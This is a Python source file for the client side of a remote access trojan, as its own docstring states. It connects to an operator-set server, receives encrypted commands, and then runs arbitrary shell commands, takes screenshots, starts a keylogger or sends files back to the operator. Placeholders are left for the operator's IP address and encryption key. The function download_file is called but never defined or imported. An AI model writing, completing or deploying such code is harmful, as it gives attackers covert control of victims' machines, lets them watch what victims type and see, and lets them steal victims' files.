import socket
from features import execute_command, capture_screenshot, keylogger_start
from utils import encrypt_data, decrypt_data

SERVER_HOST = "192.168.0.10"  # Replace with your server IP
SERVER_PORT = 9001

def start_client():
    """Start the RAT client."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        try:
            encrypted_command = client.recv(1024)
            command = decrypt_data(encrypted_command, "your-encryption-key")
            if command == "screenshot":
                result = capture_screenshot()
            elif command == "keylogger":
                result = keylogger_start()
            elif command.startswith("download"):
                filepath = command.split(" ", 1)[1]
                result = download_file(filepath, client)
            elif command == "exit":
                break
            else:
                result = execute_command(command)
            
            encrypted_result = encrypt_data(result, "your-encryption-key")
            client.send(encrypted_result)
        except Exception as e:
            encrypted_error = encrypt_data(f"Error: {str(e)}", "your-encryption-key")
            client.send(encrypted_error)
            break

    client.close()

if __name__ == "__main__":
    start_client()
